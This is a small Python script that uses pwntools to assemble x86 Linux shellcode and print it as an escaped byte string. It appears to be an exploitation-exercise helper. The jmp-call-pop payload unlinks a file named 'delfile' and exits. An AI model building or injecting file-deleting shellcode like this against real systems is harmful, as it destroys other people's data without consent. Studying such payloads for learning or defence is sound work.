#!/usr/bin/python

from pwn import *

code = '''
.global _start
_start:
        jmp     test1
test2:
        pop     ebx
        mov     al, 0xa
        int     0x80
        mov     al, 0x1
        xor     ebx, ebx
        int     0x80
test1:
        call    test2
        .string "delfile"

'''

#context(arch='x86', os='linux', endian='little', word_size=32)
shellcode = asm(code).encode('hex')
re = ''
while len(shellcode):
    re += r'\x'+shellcode[:2]
    shellcode = shellcode[2:]
print re
